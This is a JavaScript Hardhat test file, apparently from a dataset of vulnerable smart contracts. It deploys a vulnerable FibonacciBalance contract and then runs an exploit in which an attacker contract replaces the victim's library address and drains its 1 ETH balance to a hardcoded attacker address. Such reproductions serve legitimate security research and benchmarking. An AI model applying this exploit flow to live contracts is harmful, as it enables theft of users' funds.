const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack access_control/FibonacciBalance.sol", function () {
  let amount;
  async function deployContracts() {
    const [v] = await ethers.getSigners();

    const libPath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/access_control/FibonacciBalance.sol/FibonacciLib.json",
    );
    const libJson = JSON.parse(fs.readFileSync(libPath));

    const FibonacciLib = await ethers.getContractFactory(
      libJson.abi,
      libJson.bytecode,
      v,
    );
    const lib = await FibonacciLib.deploy();
    await lib.waitForDeployment();
    const address = await lib.getAddress();

    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/access_control/FibonacciBalance.sol/FibonacciBalance.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const FibonacciBalance = await ethers.getContractFactory(
      json.abi,
      json.bytecode,
      v,
    );
    amount = ethers.parseEther("1.0");
    const options = {
      from: v,
      value: amount,
    };
    const victim = await FibonacciBalance.deploy(address, options);
    await victim.waitForDeployment();

    const FibonacciBalanceAttacker = await ethers.getContractFactory(
      "contracts/access_control/FibonacciBalance_attack.sol:FibonacciBalanceAttacker",
    );
    const attacker = await FibonacciBalanceAttacker.deploy();
    await attacker.waitForDeployment();
    return { lib, victim, attacker };
  }

  it("sanity check: access_control/FibonacciBalance.sol", async function () {
    const [v] = await ethers.getSigners();
    const { lib, victim } = await loadFixture(deployContracts);
    const fibonacciLibrary = await victim.fibonacciLibrary();
    expect(fibonacciLibrary).to.equal(lib.target);
    expect(await victim.start()).to.equal(3);
    expect(await victim.withdrawalCounter()).to.equal(0);
    expect(await victim.calculatedFibNumber()).to.equal(0);
    const abi = ["function setFibonacci(uint n)"];
    const iface = new ethers.Interface(abi);

    const data = iface.encodeFunctionData("setFibonacci", [1]);
    await expect(
      v.sendTransaction({
        to: victim.target,
        data: data,
      }),
    ).not.be.reverted;
    expect(await victim.calculatedFibNumber()).to.gt(0);
  });

  it("exploit access control vulnerability", async function () {
    const { lib, victim, attacker } = await loadFixture(deployContracts);
    const victim_addr = victim.target;

    const victimBalanceBefore = await ethers.provider.getBalance(victim_addr);
    expect(victimBalanceBefore).to.equal(amount);

    const attacker_address = "0x5C6AF7679A6fCd1eb3E12ea500463ec1D90780B3";
    const attackerBalanceBefore =
      await ethers.provider.getBalance(attacker_address);
    expect(attackerBalanceBefore).to.equal(0);

    let fibonacciLibrary = await victim.fibonacciLibrary();
    expect(fibonacciLibrary).to.equal(lib.target);

    // attacker changes the FibonacciLibrary address to its own contract address
    await attacker.attack(victim_addr);
    fibonacciLibrary = await victim.fibonacciLibrary();
    expect(fibonacciLibrary).to.equal(attacker.target);

    // victim withdraws the balance
    await victim.withdraw();

    const attackerBalanceAfter =
      await ethers.provider.getBalance(attacker_address);
    expect(attackerBalanceAfter).to.equal(amount);

    const victimBalanceAfter = await ethers.provider.getBalance(victim_addr);
    expect(victimBalanceAfter).to.equal(0);
  });
});
